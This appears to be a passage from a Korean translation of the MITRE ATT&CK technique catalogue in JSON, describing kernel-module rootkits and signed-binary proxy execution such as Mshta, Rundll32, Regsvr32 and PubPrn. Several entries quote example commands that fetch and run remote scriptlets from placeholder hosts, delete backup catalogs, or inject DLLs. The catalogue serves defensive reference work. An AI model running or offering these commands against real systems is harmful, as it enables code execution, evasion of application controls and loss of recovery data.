      "translated": true
    },
    {
      "description": "로드할 수 있는 커널 모듈(Loadable Kernel Modules, LKM)은 필요에 따라 커널에 로드되고 언로드될 수 있는 코드 조각입니다. 이는 시스템 재부팅 없이 커널의 기능을 확장합니다. 예를 들어, 장치 드라이버는 커널이 시스템에 연결된 하드웨어에 접근할 수 있도록 하는 모듈의 한 종류입니다. (출처: 리눅스 커널 프로그래밍) 악의적으로 사용될 경우, 로드할 수 있는 커널 모듈(LKM)은 가장 높은 운영 체제 권한(Ring 0)으로 실행되는 커널 모드 [루트킷](https://attack.mitre.org/techniques/T1014)으로 작용할 수 있습니다. (출처: 리눅스 커널 모듈 프로그래밍 가이드) 공격자는 로드할 수 있는 커널 모듈을 사용하여 시스템에 은밀하게 지속성을 유지하고 방어를 회피할 수 있습니다. 실제 사례가 발견되었으며 일부 오픈 소스 프로젝트도 존재합니다. (출처: 볼래틸리티 팔랑크스2) (출처: 크라우드스트라이크 리눅스 루트킷) (출처: 깃허브 레프타일) (출처: 깃허브 다이아모핀)\n\nLKM 기반 루트킷의 일반적인 기능으로는 자가 은폐, 파일, 프로세스 및 네트워크 활동의 선택적 은폐, 로그 위작, 인증된 백도어 제공 및 비특권 사용자의 루트 접근 권한 부여가 포함됩니다. (출처: 아이디펜스 루트킷 개요)\n\n커널 확장(kernel extensions), 또는 kext라고도 불리는 것은 macOS에서 시스템에 LKMs와 유사한 기능을 로드하기 위해 사용됩니다. 이는 <code>kextload</code> 및 <code>kextunload</code> 명령어를 통해 로드되고 언로드됩니다. 이 기능이 사용될 수 있는 몇 가지 예가 발견되었습니다. (출처: RSAC 2015 샌프란시스코 패트릭 워들) (출처: 시냑 시큐어 커널 확장 손상) 실제 사례가 발견되었습니다. (출처: 시큐리스트 벤티르)",
      "external_id": "T1215",
      "modified": "2021-03-30T00:59:53.427Z",
      "title": "Kernel Modules and Extensions",
      "translated": true
    },
    {
      "description": "적대자는 신뢰할 수 있는 스크립트를 사용하여 악성 파일 실행을 프록시 할 수 있으며, 이러한 스크립트는 종종 인증서로 서명됩니다. Microsoft 또는 Windows 설치의 기본값에서 다운로드된 여러 Microsoft 서명 스크립트는 다른 파일의 실행을 프록시하는 데 사용될 수 있습니다. (인용: LOLBAS 프로젝트) 이러한 행동은 적대자에 의해 악용되어 애플리케이션 제어 및 서명 검증을 우회할 수 있는 악성 파일을 실행하는 데 사용될 수 있습니다. (인용: GitHub 궁극적인 AppLocker 우회 목록)",
      "external_id": "T1216",
      "modified": "2022-04-18T14:43:46.045Z",
      "title": "System Script Proxy Execution",
      "translated": true
    },
    {
      "description": "공격자는 PubPrn을 사용하여 악의적인 원격 파일의 실행을 프록시할 수 있습니다. PubPrn.vbs는 Active Directory 도메인 서비스에 프린터를 게시하는 [Visual Basic](https://attack.mitre.org/techniques/T1059/005) 스크립트입니다. 이 스크립트는 Microsoft에 의해 서명될 수 있으며, 일반적으로 [Windows 명령 셸](https://attack.mitre.org/techniques/T1059/003)을 통해 <code>Cscript.exe</code>로 실행됩니다. 예를 들어, 다음 코드는 지정된 도메인 내에 프린터를 게시합니다: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>. (인용: pubprn)\n\n공격자는 PubPrn을 악의적인 페이로드를 원격 사이트에서 실행하기 위해 악용할 수 있습니다. (인용: Enigma0x3 PubPrn Bypass) 이를 위해 공격자는 두 번째 <code>script:</code> 매개변수를 사용하여 원격 사이트에 호스팅된 스크립틀릿 파일(.sct)을 참조하도록 설정할 수 있습니다. 예제 명령은 <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>입니다. 이 행동은 서명 검증 제한과 이 스크립트의 악용을 고려하지 않는 애플리케이션 제어 솔루션을 우회할 수 있습니다.\n\nWindows의 최신 버전(10 이상)에서는 <code>PubPrn.vbs</code>가 원격 사이트에서의 실행 프록시를 방지하도록 업데이트되었습니다. 이는 두 번째 매개변수에 지정된 프로토콜을 <code>script:</code> 의미 대신 <code>LDAP://</code>로 제한하여 수행됩니다.",
      "external_id": "T1216.001",
      "modified": "2022-04-18T14:55:35.817Z",
      "title": "PubPrn",
      "translated": true
    },
    {
      "description": "공격자는 SyncAppvPublishingServer.vbs를 악용하여 악성 [PowerShell](https://attack.mitre.org/techniques/T1059/001) 명령의 실행을 프록시할 수 있습니다. SyncAppvPublishingServer.vbs는 Windows가 애플리케이션을 가상화하는 방식(마이크로소프트 애플리케이션 가상화, 즉 App-V)과 관련된 비주얼 베이직 스크립트입니다. 예를 들어, Windows는 Win32 애플리케이션을 사용자에게 가상 애플리케이션으로 렌더링하여 사용자가 이를 로컬에 설치된 것처럼 실행하고 상호작용할 수 있도록 합니다.\n\nSyncAppvPublishingServer.vbs 스크립트는 정당한 것이며, 마이크로소프트에 의해 서명될 수 있으며, 일반적으로 `wscript.exe`를 통해 명령줄의 `\\System32`에서 실행됩니다.\n\n공격자는 SyncAppvPublishingServer.vbs를 악용하여 [PowerShell](https://attack.mitre.org/techniques/T1059/001) 실행 제한을 우회하고 방어적 대응 조치를 피하기 위해 \"내부 자원 사용\" 기법을 사용할 수 있습니다. 실행을 프록시하는 것은 `powershell.exe`를 직접 호출하는 것에 대한 신뢰할 수 있는/서명된 대안으로 작용할 수 있습니다.\n\n예를 들어, [PowerShell](https://attack.mitre.org/techniques/T1059/001) 명령은 다음과 같이 호출될 수 있습니다:\n\n`SyncAppvPublishingServer.vbs \"n; {PowerShell}\"`",
      "external_id": "T1216.002",
      "modified": "2024-09-12T19:42:21.547Z",
      "title": "SyncAppvPublishingServer",
      "translated": true
    },
    {
      "description": "적대자는 손상된 환경에 대해 더 많은 정보를 얻기 위해 브라우저에 대한 정보를 열거할 수 있습니다. 브라우저에 저장된 데이터(예: 북마크, 계정, 탐색 기록)는 사용자에 대한 다양한 개인 정보를 드러낼 수 있으며(예: 은행 사이트, 관계/관심사, 소셜 미디어 등) 서버, 도구/대시보드 또는 기타 관련 인프라와 같은 내부 네트워크 리소스에 대한 세부 정보도 포함됩니다. (출처: 카스퍼스키 자동완성)\n\n브라우저 정보는 적대자가 유효한 자격 증명에 접근한 후 추가적인 표적을 강조할 수 있으며, 특히 브라우저에 캐시된 로그인과 관련된 [파일 내 자격 증명](https://attack.mitre.org/techniques/T1552/001)와 관련이 있습니다.\n\n특정 저장 위치는 플랫폼 및/또는 애플리케이션에 따라 다르지만, 브라우저 정보는 일반적으로 로컬 파일 및 데이터베이스(예: `%APPDATA%/Google/Chrome`)에 저장됩니다. (출처: 크롬 로밍 프로필)",
      "external_id": "T1217",
      "modified": "2023-04-16T14:24:40.625Z",
      "title": "Browser Information Discovery",
      "translated": true
    },
    {
      "description": "적대자는 서명된 바이너리 또는 기타 신뢰할 수 있는 바이너리를 사용하여 악성 콘텐츠의 실행을 프록시함으로써 프로세스 및 서명 기반 방어를 우회할 수 있습니다. 이 기술에 사용되는 바이너리는 종종 Microsoft 서명 파일로, 이는 Microsoft에서 다운로드했거나 운영 체제에 이미 기본적으로 포함되어 있음을 나타냅니다.(인용: LOLBAS 프로젝트) 신뢰할 수 있는 디지털 인증서로 서명된 바이너리는 일반적으로 디지털 서명 검증에 의해 보호되는 Windows 시스템에서 실행될 수 있습니다. Windows 설치의 기본으로 제공되는 여러 Microsoft 서명 바이너리는 다른 파일이나 명령의 실행을 프록시하는 데 사용할 수 있습니다.\n\n유사하게, Linux 시스템에서도 적대자는 <code>split</code>과 같은 신뢰할 수 있는 바이너리를 악용하여 악성 명령의 실행을 프록시할 수 있습니다.(인용: split 매뉴얼 페이지)(인용: GTFO split)",
      "external_id": "T1218",
      "modified": "2024-03-01T16:25:43.150Z",
      "title": "System Binary Proxy Execution",
      "translated": true
    },
    {
      "description": "공격자는 악성 코드를 숨기기 위해 컴파일된 HTML 파일(.chm)을 악용할 수 있습니다. CHM 파일은 일반적으로 Microsoft HTML 도움말 시스템의 일환으로 배포됩니다. CHM 파일은 HTML 문서, 이미지 및 VBA, JScript, Java, ActiveX와 같은 스크립팅/웹 관련 프로그래밍 언어를 포함한 다양한 콘텐츠의 압축된 컴파일입니다. (출처: Microsoft HTML Help May 2018) CHM 콘텐츠는 HTML 도움말 실행 프로그램(hh.exe)에 의해 로드된 Internet Explorer 브라우저의 기본 구성 요소를 사용하여 표시됩니다. (출처: Microsoft HTML Help ActiveX) (출처: Microsoft HTML Help Executable Program)\n\n내부 페이로드가 포함된 맞춤형 CHM 파일이 피해자에게 전달된 후 [사용자 실행](https://attack.mitre.org/techniques/T1204)에 의해 실행될 수 있습니다. CHM 실행은 또한 hh.exe를 통해 이진 실행을 고려하지 않는 오래되었거나 패치되지 않은 시스템에서 애플리케이션 제어를 우회할 수 있습니다. (출처: MsitPros CHM Aug 2017) (출처: Microsoft CVE-2017-8625 Aug 2017)",
      "external_id": "T1218.001",
      "modified": "2023-10-18T16:31:56.936Z",
      "title": "Compiled HTML File",
      "translated": true
    },
    {
      "description": " adversaries(상대방)은 control.exe를 악성 페이로드의 프록시 실행에 악용할 수 있습니다. Windows 제어판 프로세스 이진 파일(control.exe)은 제어판 항목의 실행을 처리하는데, 이는 사용자가 컴퓨터 설정을 보고 조정할 수 있도록 하는 유틸리티입니다.\n\n제어판 항목은 실행 파일(.exe) 또는 제어판(.cpl) 파일로 등록되며, 후자는 실제로는 동적 연결 라이브러리(.dll) 파일의 이름을 변경한 것으로 <code>CPlApplet</code> 함수를 내보냅니다. (출처: Microsoft Implementing CPL)(출처: TrendMicro CPL Malware Jan 2014) 사용의 편리성을 위해 제어판 항목은 일반적으로 등록되고 제어판에 로드된 후 사용자가 사용할 수 있는 그래픽 메뉴를 포함합니다. (출처: Microsoft Implementing CPL) 제어판 항목은 명령 줄에서 직접 실행하거나 응용 프로그램 프로그래밍 인터페이스(API) 호출을 통해 프로그래밍 방식으로 실행하거나 파일을 더블 클릭하여 쉽게 실행할 수 있습니다. (출처: Microsoft Implementing CPL) (출처: TrendMicro CPL Malware Jan 2014)(출처: TrendMicro CPL Malware Dec 2013)\n\n악성 제어판 항목은 [피싱](https://attack.mitre.org/techniques/T1566) 캠페인(출처: TrendMicro CPL Malware Jan 2014)(출처: TrendMicro CPL Malware Dec 2013)을 통해 전달되거나 다단계 악성코드의 일부로 실행될 수 있습니다. (출처: Palo Alto Reaver Nov 2017) 특히 CPL 파일인 제어판 항목은 애플리케이션 및/또는 파일 확장자 허용 목록을 우회할 수도 있습니다.\n\n상대방은 또한 악성 DLL 파일(.dll)의 이름을 제어판 파일 확장자(.cpl)로 바꾸고 이를 <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls</code>에 등록할 수 있습니다. 등록된 DLL이 CPL 파일 사양을 준수하지 않거나 <code>CPlApplet</code> 함수를 내보내지 않더라도 제어판이 실행될 때 <code>DllEntryPoint</code>를 통해 로드되고 실행됩니다. <code>CPlApplet</code>을 내보내지 않는 CPL 파일은 직접 실행할 수 없습니다. (출처: ESET InvisiMole June 2020)",
      "external_id": "T1218.002",
      "modified": "2022-03-11T19:01:55.821Z",
      "title": "Control Panel",
      "translated": true
    },
    {
      "description": "적대자는 CMSTP를 악성 코드의 프록시 실행에 악용할 수 있습니다. Microsoft Connection Manager 프로필 인스톨러 (CMSTP.exe)는 Connection Manager 서비스 프로필을 설치하는 데 사용되는 명령줄 프로그램입니다. (출처: Microsoft Connection Manager 2009년 10월) CMSTP.exe는 설치 정보 파일(INF)을 매개변수로 받아들이고 원격 연결을 위한 서비스 프로필을 설치합니다.\n\n적대자는 CMSTP.exe에 악성 명령이 포함된 INF 파일을 제공할 수 있습니다. (출처: Twitter CMSTP 사용 2018년 1월) [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / \"Squiblydoo\"와 유사하게, CMSTP.exe는 DLL을 로드하고 실행하는 데 악용될 수 있습니다 (출처: MSitPros CMSTP 2017년 8월) 및/또는 원격 서버에서 COM 스크립틀렛(SCT)을 실행할 수 있습니다. (출처: Twitter CMSTP 2018년 1월) (출처: GitHub Ultimate AppLocker Bypass List) (출처: Endurant CMSTP 2018년 7월) 이러한 실행은 CMSTP.exe가 Microsoft에 의해 서명된 합법적인 바이너리이기 때문에 AppLocker 및 기타 응용 프로그램 제어 방어를 우회할 수 있습니다.\n\nCMSTP.exe는 또한 [사용자 계정 컨트롤 우회](https://attack.mitre.org/techniques/T1548/002) 및 악성 INF를 통해 임의의 명령을 자동 상승된 COM 인터페이스로 실행하는 데 악용될 수 있습니다. (출처: MSitPros CMSTP 2017년 8월) (출처: GitHub Ultimate AppLocker Bypass List) (출처: Endurant CMSTP 2018년 7월)",
      "external_id": "T1218.003",
      "modified": "2024-09-12T19:35:43.077Z",
      "title": "CMSTP",
      "translated": true
    },
    {
      "description": "적대자는 신뢰된 Windows 유틸리티를 통해 코드 실행을 프록시하기 위해 InstallUtil을 사용할 수 있습니다. InstallUtil은 특정 설치 구성 요소를 실행하여 리소스의 설치 및 제거를 가능하게 하는 커맨드라인 유틸리티입니다. 이 구성 요소는 .NET 바이너리에 지정되어 있습니다. (출처: MSDN InstallUtil) InstallUtil 바이너리는 Microsoft에 의해 디지털 서명될 수 있으며 Windows 시스템의 .NET 디렉터리에 위치할 수 있습니다: <code>C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe</code> 및 <code>C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe</code>.\n\nInstallUtil은 또한 바이너리 내의 속성을 활용하여 애플리케이션 제어를 우회하는 데 사용될 수 있습니다. 이 속성은 <code>[System.ComponentModel.RunInstaller(true)]</code>로 장식된 클래스를 실행합니다. (출처: LOLBAS Installutil)",
      "external_id": "T1218.004",
      "modified": "2022-03-11T18:47:52.603Z",
      "title": "InstallUtil",
      "translated": true
    },
    {
      "description": "공격자는 mshta.exe를 악성 .hta 파일과 Javascript 또는 VBScript를 신뢰할 수 있는 Windows 유틸리티를 통해 프록시 실행하는 데 악용할 수 있습니다. 초기 침해 및 코드 실행을 위해 mshta.exe를 활용하는 다양한 유형의 위협에 대한 여러 예가 있습니다 (인용: Cylance Dust Storm) (인용: Red Canary HTA Abuse Part Deux) (인용: FireEye Attacks Leveraging HTA) (인용: Airbus Security Kovter Analysis) (인용: FireEye FIN7 2017년 4월).\n\nMshta.exe는 Microsoft HTML 애플리케이션(HTA) 파일을 실행하는 유틸리티입니다. (인용: Wikipedia HTML Application) HTA는 브라우저 외부에서 Internet Explorer의 동일한 모델과 기술을 사용하여 실행되는 독립 실행형 애플리케이션입니다. (인용: MSDN HTML Applications)\n\nmshta.exe를 통해 인라인 스크립트를 통해 파일을 실행할 수 있습니다: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\n또한 URL에서 직접 실행할 수도 있습니다: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe는 사용 가능성을 고려하지 않는 애플리케이션 제어 솔루션을 우회하는 데 사용될 수 있습니다. mshta.exe는 Internet Explorer의 보안 컨텍스트 외부에서 실행되기 때문에 브라우저 보안 설정을 우회합니다. (인용: LOLBAS Mshta)",
      "external_id": "T1218.005",
      "modified": "2022-03-11T20:38:28.802Z",
      "title": "Mshta",
      "translated": true
    },
    {
      "description": "공격자는 msiexec.exe를 악성 페이로드의 프록시 실행에 악용할 수 있습니다. msiexec.exe는 Windows Installer의 명령줄 유틸리티로, 설치 패키지(.msi)를 실행하는 데 일반적으로 사용됩니다. (출처: Microsoft msiexec) Msiexec.exe 바이너리는 또한 Microsoft에 의해 디지털 서명될 수 있습니다.\n\n공격자는 msiexec.exe를 사용하여 로컬 또는 네트워크에서 접근 가능한 MSI 파일을 실행할 수 있습니다. msiexec.exe는 DLL을 실행할 수도 있습니다. (출처: LOLBAS Msiexec)(출처: TrendMicro Msiexec 2018년 2월) msiexec.exe는 Windows 시스템에서 서명되고 기본적으로 사용할 수 있기 때문에, 그 잠재적인 악용을 고려하지 않는 애플리케이션 제어 솔루션을 우회하는 데 사용될 수 있습니다. 또한 <code>AlwaysInstallElevated</code> 정책이 활성화되면 msiexec.exe의 실행이 SYSTEM 권한으로 상승할 수 있습니다. (출처: Microsoft AlwaysInstallElevated 2018)",
      "external_id": "T1218.007",
      "modified": "2022-04-19T17:33:16.346Z",
      "title": "Msiexec",
      "translated": true
    },
    {
      "description": "공격자는 odbcconf.exe를 악성 페이로드의 프록시 실행에 악용할 수 있습니다. odbcconf.exe는 Open Database Connectivity (ODBC) 드라이버 및 데이터 원본 이름을 구성하는 Windows 유틸리티입니다. (인용: Microsoft odbcconf.exe) Odbcconf.exe 이진 파일은 Microsoft에 의해 디지털 서명될 수 있습니다.\n\n공격자는 odbcconf.exe를 악용하여 그 잠재적 악용을 고려하지 않는 애플리케이션 제어 솔루션을 우회할 수 있습니다. [Regsvr32](https://attack.mitre.org/techniques/T1218/010)와 유사하게, odbcconf.exe는 DLL을 실행하기 위해 오용될 수 있는 <code>REGSVR</code> 플래그가 있습니다 (예: <code>odbcconf.exe /S /A &lbrace;REGSVR \"C:\\Users\\Public\\file.dll\"&rbrace;</code>). (인용: LOLBAS Odbcconf)(인용: TrendMicro Squiblydoo Aug 2017)(인용: TrendMicro Cobalt Group Nov 2017)",
      "external_id": "T1218.008",
      "modified": "2022-03-11T18:52:49.877Z",
      "title": "Odbcconf",
      "translated": true
    },
    {
      "description": "공격자는 신뢰할 수 있는 Windows 유틸리티를 통해 코드를 프록시 실행하는 데 Regsvcs와 Regasm을 악용할 수 있습니다. Regsvcs와 Regasm은 .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) 어셈블리를 등록하는 데 사용되는 Windows 명령줄 유틸리티입니다. 두 유틸리티 모두 마이크로소프트에 의해 디지털 서명된 바이너리일 수 있습니다. (인용: MSDN Regsvcs) (인용: MSDN Regasm)\n\n두 유틸리티 모두 바이너리 내의 속성을 활용하여 등록 또는 등록 해제 전에 실행해야 할 코드를 지정함으로써 애플리케이션 제어를 우회하는 데 사용될 수 있습니다: <code>[ComRegisterFunction]</code> 또는 <code>[ComUnregisterFunction]</code> 각각. 등록 및 등록 해제 속성이 있는 코드는 프로세스가 권한이 불충분하여 실행에 실패하더라도 실행됩니다. (인용: LOLBAS Regsvcs)(인용: LOLBAS Regasm)",
      "external_id": "T1218.009",
      "modified": "2022-03-11T18:55:48.725Z",
      "title": "Regsvcs/Regasm",
      "translated": true
    },
    {
      "description": "공격자는 Regsvr32.exe를 악의적인 코드 실행을 위한 프록시로 악용할 수 있습니다. Regsvr32.exe는 Windows 시스템에서 객체 연결 및 포함(OLE) 제어 및 동적 링크 라이브러리(DLL)를 등록하고 등록 해제하는 데 사용되는 명령줄 프로그램입니다. Regsvr32.exe 바이너리는 또한 Microsoft에 의해 서명될 수 있습니다. (출처: Microsoft Regsvr32)\n\nRegsvr32.exe의 악의적인 사용은 보통 허용 목록이나 정상 운영을 위해 regsvr32.exe를 사용하는 Windows의 오탐지로 인해 regsvr32.exe 프로세스의 실행 및 로드된 모듈을 모니터링하지 않는 보안 도구를 우회할 수 있습니다. Regsvr32.exe는 또한 사용자의 권한 하에 DLL을 실행하기 위해 COM 스크립틀렛을 로드하는 기능을 사용하여 애플리케이션 제어를 특정하게 우회하는 데 사용할 수 있습니다. Regsvr32.exe는 네트워크 및 프록시 인식 기능이 있어, 호출 시 인수로 외부 웹 서버의 파일에 대한 균일 자원 식별자(URL)를 전달하여 스크립트를 로드할 수 있습니다. 이 방법은 COM 객체가 실제로 등록되지 않고 실행되기만 하므로 레지스트리에 변경을 주지 않습니다. (출처: LOLBAS Regsvr32) 이 기술의 변형은 종종 \"Squiblydoo\"로 언급되며, 정부를 목표로 한 캠페인에서 사용된 적이 있습니다. (출처: Carbon Black Squiblydoo 2016년 4월) (출처: FireEye Regsvr32 몽골 정부 타겟팅)\n\nRegsvr32.exe는 또한 [구성 요소 개체 모델 탈취](https://attack.mitre.org/techniques/T1546/015)를 통해 지속성을 확립하는 데 사용되는 COM 객체를 등록하는 데 활용될 수 있습니다. (출처: Carbon Black Squiblydoo 2016년 4월)",
      "external_id": "T1218.010",
      "modified": "2023-04-21T12:24:56.148Z",
      "title": "Regsvr32",
      "translated": true
    },
    {
      "description": "적대자는 rundll32.exe를 악성 코드 실행을 프록시하기 위해 악용할 수 있습니다. rundll32.exe를 사용함으로써 직접 실행하지 않고([공유 모듈](https://attack.mitre.org/techniques/T1129) 참조), 형식 리스트나 정상 작동에서의 허위 긍정 반응 때문에 rundll32.exe 프로세스의 실행을 모니터링하지 않는 보안 도구를 우회할 수 있습니다. rundll32.exe는 DLL 페이로드를 실행하는 데 일반적으로 사용됩니다(예: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nrundll32.exe는 또한 문서화되지 않은 shell32.dll 함수인 <code>Control_RunDLL</code> 및 <code>Control_RunDLLAsUser</code>를 통해 제어판 항목 파일(.cpl)을 실행하는 데 사용될 수 있습니다. .cpl 파일을 두 번 클릭하면 rundll32.exe가 실행됩니다.(인용: Trend Micro CPL) 예를 들어, [ClickOnce](https://attack.mitre.org/techniques/T1127/002)는 rundll32.exe를 통해 프록시될 수 있습니다.\n\n또한, rundll32를 사용하여 JavaScript와 같은 스크립트를 실행할 수 있습니다. 이는 다음과 유사한 구문을 사용하여 수행될 수 있습니다: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>. 이러한 행동은 Poweliks와 같은 악성 코드에서 사용된 것으로 관찰되었습니다.(인용: This is Security Command Line Confusion)\n\n적대자는 또한 rundll32.exe가 DLL 함수 이름을 로드하는 방식을 악용하여 악성 코드를 분석에서 숨기려고 할 수 있습니다. Windows의 문자 집합 호환성 지원의 일환으로, rundll32.exe는 먼저 지정된 함수를 로드하기 전에 와이드/유니코드 지원 함수와 ANSI 문자 지원 함수를 확인합니다(예: <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>라는 명령을 주면, rundll32.exe는 먼저 <code>ExampleFunctionW</code>를 실행하려고 시도하고, 실패할 경우 <code>ExampleFunctionA</code>를 시도한 후 <code>ExampleFunction</code>을 로드합니다). 따라서 적대자는 무해한 함수 이름에 <code>W</code> 및/또는 <code>A</code>를 추가하여 악성 코드를 숨길 수 있습니다.(인용: Attackify Rundll32.exe Obscurity)(인용: Github NoRunDll) DLL 함수는 또한 순서 번호로 내보내고 실행될 수 있습니다(예: <code>rundll32.exe file.dll,#1</code>).\n\n추가적으로, 적대자는 [가장하기](https://attack.mitre.org/techniques/T1036) 기법(예: DLL 파일 이름, 파일 확장자 또는 함수 이름 변경)을 사용하여 악성 페이로드 실행을 더욱 숨길 수 있습니다.(인용: rundll32.exe 방어 회피)",
      "external_id": "T1218.011",
      "modified": "2024-10-14T13:14:43.083Z",
      "title": "Rundll32",
      "translated": true
    },
    {
      "description": "적대 세력은 verclsid.exe를 악성 코드를 실행하기 위한 프록시로 악용할 수 있습니다. verclsid.exe는 확장 CLSID 검증 호스트로 알려져 있으며, Windows 탐색기나 Windows 셸에서 사용되기 전에 각 셸 확장을 확인하는 역할을 수행합니다.\n\n적대 세력은 verclsid.exe를 이용해 악성 페이로드를 실행할 수 있습니다. 이는 <code>verclsid.exe /S /C {CLSID}</code> 명령을 실행함으로써 달성될 수 있으며, 여기서 파일은 COM 객체를 식별하는 고유 식별 번호인 클래스 ID(CLASSID)에 의해 참조됩니다. verclsid.exe에 의해 실행된 COM 페이로드는 원격 서버에서 COM 스크립틀렛(SCT)을 불러오고 실행하는 등의 다양한 악성 행위를 수행할 수 있습니다. 이는 [Regsvr32](https://attack.mitre.org/techniques/T1218/010)와 유사합니다. 해당 이진 파일은 서명되어 있거나 Windows 시스템에 기본적으로 존재할 수 있으므로, verclsid.exe를 통한 실행 프록시는 그潜在적인 남용을 고려하지 않는 응용 프로그램 제어 솔루션을 우회할 수 있습니다.",
      "external_id": "T1218.012",
      "modified": "2022-05-20T17:35:28.221Z",
      "title": "Verclsid",
      "translated": true
    },
    {
      "description": "위협 행위자는 mavinject.exe를 악성 코드 실행을 프록시하는 데 악용할 수 있습니다. mavinject.exe는 마이크로소프트 애플리케이션 가상화 주입기(Microsoft Application Virtualization Injector)로, Windows 유틸리티이며, 마이크로소프트 애플리케이션 가상화(App-V)의 일환으로 외부 프로세스에 코드를 주입할 수 있습니다. (출처: LOLBAS Mavinject)\n\n위협 행위자는 mavinject.exe를 이용해 실행 중인 프로세스에 악성 DLL을 주입할 수 있습니다(예: [동적 링크 라이브러리 주입](https://attack.mitre.org/techniques/T1055/001)). 이를 통해 임의 코드 실행이 가능해집니다(예: <code>C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>). (출처: ATT Lazarus TTP Evolution)(출처: Reaqta Mavinject) mavinject.exe가 마이크로소프트에 의해 디지털 서명되어 있을 수 있기 때문에, 이 방법을 통해 진행되는 실행은 합법적인 프로세스 아래에서 마스킹되므로 보안 제품에 의해 탐지되지 않을 수 있습니다.\n\n[동적 링크 라이브러리 주입](https://attack.mitre.org/techniques/T1055/001) 외에도, mavinject.exe는 <code>/HMODULE</code> 명령줄 매개변수를 통해 import descriptor injection을 수행하는 데 악용될 수 있습니다(예: <code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>). 이 명령은 지정된 DLL로 구성된 import 테이블 항목을 주어진 기본 주소의 모듈에 주입합니다. (출처: Mavinject 기능 분석)",
      "external_id": "T1218.013",
      "modified": "2022-04-19T17:35:08.315Z",
      "title": "Mavinject",
      "translated": true
    },
    {
      "description": "적대자는 mmc.exe를 악성 .msc 파일의 프록시 실행에 악용할 수 있습니다. Microsoft Management Console(MMC)은 Microsoft에서 서명할 수 있는 이진 파일로, GUI 또는 명령 프롬프트에서 여러가지 방법으로 사용됩니다. MMC는 Microsoft에서 생성한 관리 도구인 스냅인을 포함하는 사용자 정의 콘솔을 생성, 열기 및 저장하는 데 사용될 수 있습니다. 이러한 스냅인은 Windows 시스템을 로컬 또는 원격으로 관리하는 데 사용될 수 있습니다. 또한 MMC는 시스템 구성 관리를 위해 Microsoft에서 생성한 .msc 파일을 열어보는 데에도 사용됩니다.\n\n예를 들어, `<code>mmc C:\\Users\\foo\\admintools.msc /a</code>` 명령은 작성 모드에서 사용자 정의로 저장된 콘솔 msc 파일을 엽니다. 또 다른 일반 예는 `<code>mmc gpedit.msc</code>`로, 이는 그룹 정책 편집기 응용 프로그램 창을 엽니다.\n\n적대자는 악의적인 작업을 수행하기 위해 MMC 명령을 사용할 수 있습니다. 예를 들어, `<code>mmc wbadmin.msc delete catalog -quiet</code>` 명령은 사용자에게 아무런 메시지 없이 시스템의 백업 카탈로그를 삭제합니다(즉, [시스템 복구 방지](https://attack.mitre.org/techniques/T1490)). (참고: `<code>wbadmin.msc</code>`는 기본적으로 Windows Server 운영 체제에만 존재할 수 있습니다.)\n\n적대자는 또한 MMC를 악성 .msc 파일 실행에 악용할 수 있습니다. 예를 들어, 적대자는 먼저 악성 레지스트리 클래스 식별자(CLSID) 하위 키를 생성하여 [컴포넌트 객체 모델](https://attack.mitre.org/techniques/T1559/001) 클래스 객체를 고유하게 식별할 수 있습니다. 그런 다음, 적대자는 악성 CLSID 하위 키에 연결된 \"웹 주소에 링크\" 스냅인을 사용하여 사용자 정의 콘솔을 생성할 수 있습니다. .msc 파일이 저장되면, 적대자는 다음 명령을 사용하여 악성 CLSID 페이로드를 호출할 수 있습니다: `<code>mmc.exe -Embedding C:\\path\\to\\test.msc</code>`.",
      "external_id": "T1218.014",
      "modified": "2022-05-20T17:41:16.112Z",
      "title": "MMC",
      "translated": true
    },
    {
      "description": "적대자는 Electron 프레임워크의 구성 요소를 악용하여 악성 코드를 실행할 수 있습니다. Electron 프레임워크는 Signal, Slack, Microsoft Teams와 같은 많은 일반 응용 프로그램을 호스팅합니다. Electron은 원래 GitHub에 의해 개발된 크로스 플랫폼 데스크톱 응용 프로그램 개발 프레임워크로, JavaScript, HTML 및 CSS와 같은 웹 기술을 사용합니다. Chromium 엔진은 웹 콘텐츠를 표시하는 데 사용되며, Node.js는 백엔드 코드를 실행합니다.\n\nElectron의 기능적 메커니즘(예: 응용 프로그램이 임의의 명령을 실행할 수 있도록 허용하는 등)으로 인해, 적대자는 프레임워크 내에서 합법적인 도구로 위장된 상태로 백그라운드에서 악의적인 기능을 수행할 수 있습니다. 예를 들어, `teams.exe` 및 `chrome.exe`의 악용은 적대자가 합법적인 응용 프로그램의 자식 프로세스로 악성 명령을 실행할 수 있게 할 수 있습니다(예: `chrome.exe --disable-gpu-sandbox --gpu-launcher=\"C:\\Windows\\system32\\cmd.exe /c calc.exe\"`).\n\n적대자는 또한 Electron 응용 프로그램 내에 악성 [JavaScript](https://attack.mitre.org/techniques/T1059/007)를 심어 악성 콘텐츠를 실행할 수도 있습니다.",
      "external_id": "T1218.015",
      "modified": "2024-04-15T23:00:33.493Z",
      "title": "Electron Applications",
      "translated": true
    },
    {
